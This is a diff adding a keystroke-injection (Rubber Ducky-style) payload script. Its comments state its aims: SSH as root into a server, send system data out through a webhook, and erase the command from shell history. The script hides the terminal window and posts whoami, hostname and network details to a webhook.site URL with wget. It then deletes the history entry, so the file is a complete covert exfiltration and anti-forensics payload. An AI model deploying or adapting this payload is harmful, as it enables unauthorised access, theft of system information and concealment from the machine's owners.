@@ -1,0 +1,13 @@
+REM 1) Connect to an SSH server by public key authorization.
+REM 2) Send a webhook with some server's data, such as IP, Username, Hostname, etc.
+REM 3) Delete last executed command from the server's history file.
+
+DELAY 1000
+ALT F2
+DELAY 200
+STRING gnome-terminal --geometry 0x0+0+0 -x ssh root@190.111.222.333
+ENTER
+DELAY 300
+STRING wget --post-data "d=$(whoami;hostname;ip a)" https://webhook.site/ae21cf97-02db-4fab-ab97-9e83820a8dea;history -d $((HISTCMD));exit;
+DELAY 900
+ENTER
